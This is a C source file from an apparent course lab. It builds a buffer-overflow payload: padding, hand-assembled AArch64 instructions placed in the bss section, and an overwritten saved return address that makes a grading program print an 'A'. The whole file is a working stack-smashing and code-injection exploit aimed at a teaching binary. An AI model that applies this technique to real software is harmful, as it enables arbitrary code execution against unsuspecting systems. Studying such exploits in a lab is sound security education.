/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Nicholas Nguyen & Moses Yang                               */
/*--------------------------------------------------------------------*/
/* Produces a file called dataA with the student name, a nullbyte, 
   passing to overrun the stack, and the address of the instruction 
   in main to get a B, the latter of which will overwrite getName's 
   stored x30.                                                        */

 #include <stdio.h>
 #include <stdlib.h>
 #include "miniassembler.h"

 int main(void) {
    int i;
    unsigned int uiInstr;

    /* Char array containing my name */
    char name[] = "Nicholas Nguyen";

    /* Replacing getName() return address to the address in the bss 
       section where we stored assembly code to change the grade to A */
    const unsigned int returnAddress = 0x420078;
    /* Replacing magic numbers with variables. Easier on the eyes. */
    const unsigned int gradeAddress = 0x420044;
    const unsigned int bssAdrStart = 0x42007C;
    const unsigned int bssBstart = 0x420084;
    const unsigned int skipToPrintf = 0x40089c;

    /* Open a new file named "dataA", with the power to write */
    FILE *psFile; 
    psFile = fopen("dataA", "w");

    /* Print my name to the dataA file */
    fprintf(psFile, name);
    
    /* filler null bytes */
    for (i = 0; i <= 16; i++) 
    {
        fprintf(psFile, "%c", 0);
    }
    /* mov x0, "A" */
    uiInstr = MiniAssembler_mov(0, 'A');
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* adr x1, 0x420044 (address of grade = "D") */
    uiInstr = MiniAssembler_adr(1, gradeAddress, bssAdrStart);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* strb x0, [x1] */
    uiInstr = MiniAssembler_strb(0, 1);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* b to printf("%c is your grade.\n)", grade */
    uiInstr = MiniAssembler_b(skipToPrintf, bssBstart);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* Overrwriting x30 with the address to the bss section to get an A */
    fwrite(&returnAddress, sizeof(unsigned int), 1, psFile);

    /* Close file */
    fclose(psFile);
    
    return 0;

 }
